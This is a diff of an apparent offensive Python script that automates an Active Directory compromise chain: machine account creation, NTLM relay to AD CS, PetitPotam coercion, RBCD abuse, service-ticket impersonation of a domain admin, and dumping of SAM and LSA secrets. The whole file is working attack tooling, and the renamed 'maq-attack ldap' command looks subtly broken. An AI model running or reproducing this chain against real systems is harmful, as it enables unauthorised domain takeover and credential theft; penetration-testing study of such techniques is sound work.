@@ -12,7 +12,7 @@ def run_command(command):
     return result.stdout.strip()
 
 def check_maq(dc_ip, username, password):
-    output = run_command(f"nxc ldap {dc_ip} -u {username} -p {password} -M maq")
+    output = run_command(f"maq-attack ldap {dc_ip} -u {username} -p {password} -M maq")
     try:
         maq_value = int(output.split("MachineAccountQuota:")[1].split()[0])
         return maq_value
@@ -22,13 +22,13 @@ def check_maq(dc_ip, username, password):
 
 def help():
     help_text = """
-Usage: python automate_steps.py
+Usage: python maq-attack.py
 
 This script automates the process of identifying machine account quotas, creating machine accounts, configuring NTLM relay, coercing target computers, obtaining NTLM hashes, modifying attributes, and dumping SAM and LSA secrets.
 
 Steps:
 1. Identify Machine Account Quota (MAQ):
-   Runs the `nxc ldap` command to check the machine account quota for the specified domain and user.
+   Runs the `maq-attack ldap` command to check the machine account quota for the specified domain and user.
 
 2. Create Machine Account:
    Uses `certipy` to create a machine account with the specified username, password, and domain controller IP.
@@ -74,24 +74,32 @@ Parameters:
 
 def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_ip, ad_cs_web_enroll, your_ip, target_ip, target_machine, domain_admin):
     # Step 1: Identify MAQ
+    print("[*] Checking Machine Account Quota (MAQ)...")
     maq_value = check_maq(dc_ip, username, password)
     if maq_value <= 0:
         print("Machine Account Quota is 0. Exiting.")
         return
+    print(f"[*] Machine Account Quota (MAQ) found: {maq_value}")
 
     # Step 2: Create Machine Account
-    run_command(f"certipy account create -u {username}@{domain} -p {password} -dc-ip {dc_ip} -user {machine_acc}$ -pass {machine_acc_pw}")
-    
+    print("[*] Creating machine account...")
+    run_command(f"certipy account create -u {username}@{domain} -p '{password}' -dc-ip {dc_ip} -user {machine_acc}$ -pass '{machine_acc_pw}'")
+
     # Step 3: Configure NTLM Relay With Certipy
+    print("[*] Configuring NTLM relay with Certipy...")
     run_command(f"certipy relay -target http://{ad_cs_web_enroll} -template Machine")
-    
+    print("[*] NTLM relay configuration complete.")
+
     # Step 4: Coerce Target Computer With PetitPotam
+    print("[*] Coercing target computer with PetitPotam...")
     home_dir = os.path.expanduser("~")
-    run_command(f"python3 {home_dir}/PetitPotam/PetitPotam.py {your_ip} {target_ip}")
-    
+    run_command(f"python3 {home_dir}/PetitPotam/PetitPotam.py -u {username} -p '{password}' {your_ip} {target_ip}")
+    print("[*] Target coercion complete.")
+
     # Step 5: Get NTLM Hash of Target Machine
+    print("[*] Authenticating with Certipy to get NTLM hash of the target machine...")
     pfx_output = run_command(f"certipy auth -pfx {machine_acc}.pfx")
-    
+
     # Extract NTLM hash from the output
     ntlm_hash = None
     for line in pfx_output.split('\n'):
@@ -102,13 +110,16 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
     if not ntlm_hash:
         print("NTLM hash not found in the output of certipy auth. Exiting.")
         return
+    print(f"[*] NTLM hash obtained: {ntlm_hash}")
 
     # Step 6: Modify msDS-AllowedToActOnBehalfOfOtherIdentity Attribute
+    print("[*] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity attribute...")
     run_command(f"python3 /usr/local/bin/rbcd.py -action write -delegate-to {target_machine} -delegate-from {machine_acc}$ domain.local/{target_machine} -hashes ':{ntlm_hash}'")
-    
-    # Step 7: Obtain ST
+
+    # Step 7: Obtain Service Ticket (ST)
+    print("[*] Obtaining Service Ticket (ST)...")
     st_output = run_command(f"python3 /usr/local/bin/getST.py -spn cifs/{target_machine} 'domain/{machine_acc}$' -impersonate {domain_admin} -dc-ip {dc_ip}")
-    
+
     # Extract the ccache file name from the output
     ccache_file = None
     for line in st_output.split('\n'):
@@ -119,14 +130,18 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
     if not ccache_file:
         print("ccache file not found in the output of getST.py. Exiting.")
         return
+    print(f"[*] Ccache file obtained: {ccache_file}")
 
     # Step 8: Import ST to Machine
+    print(f"[*] Importing Service Ticket: {ccache_file}")
     os.environ['KRB5CCNAME'] = ccache_file
-    
+
     # Step 9: Dump SAM
+    print("[*] Dumping SAM database...")
     run_command(f"netexec smb {target_machine} -u {machine_acc}$ --use-kcache -k --sam")
-    
+
     # Step 10: Dump LSA Secrets
+    print("[*] Dumping LSA secrets...")
     run_command(f"netexec smb {target_machine} -u {machine_acc}$ --use-kcache -k --lsa")
 
 if __name__ == "__main__":
